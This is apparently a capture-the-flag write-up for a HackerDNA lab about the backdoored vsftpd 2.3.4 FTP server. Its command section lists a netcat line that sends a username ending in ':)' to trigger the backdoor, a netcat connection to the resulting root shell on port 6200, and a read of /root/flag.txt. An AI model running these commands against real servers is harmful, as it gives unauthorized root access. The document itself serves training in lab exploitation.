![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat)
![Tool](https://img.shields.io/badge/Tool-Nmap-red)
![Status](https://img.shields.io/badge/Status-Complete-brightgreen)
![Platform](https://img.shields.io/badge/Platform-HackerDNA-blue)
![Skill](https://img.shields.io/badge/Skill-BackdoorExploitation-success)

# Anonymous 2 - vsftpd 2.3.4 Backdoor   
**Platform:** HackerDNA  
**Difficulty:** Easy  
**Points:** 10 

A concise walkthrough of the Anonymous 2 lab from HackerDNA, demonstrating enumeration and exploitation of the intentionally backdoored vsftpd 2.3.4 service. Submitting a username ending in :) triggers a hidden routine that opens a root shell on port 6200.

Note: Lab IPs rotate on each deployment. All addresses are represented as <FTP_IP> and <WEB_IP>.

## Objective  
Identify the vulnerable FTP service, trigger the vsftpd backdoor, gain shell access, and retrieve the flag.

## Vulnerability Summary  
Scanned port 21 to identify the FTP service and version

Confirmed vsftpd 2.3.4, a known backdoored release

Triggered the backdoor using a crafted username ending in :)

Connected to the spawned shell on port 6200

Executed commands in a silent root shell

Located and read the flag

Key Commands
nmap -sV -p 21 <FTP_IP>

(echo "USER test:)"; echo "PASS pass") | nc -v <FTP_IP> 21
nc -v <FTP_IP> 6200

whoami
cat /root/flag.txt

## Flag
e*******-****-****-****-**********3

## Takeaways
- vsftpd 2.3.4 contains a deliberate backdoor and should never be deployed.

- A single compromised package can provide immediate root access.

- Silent shells require careful, confident command execution.

- Enumeration confirms the path; exploitation is minimal once the version is identified.
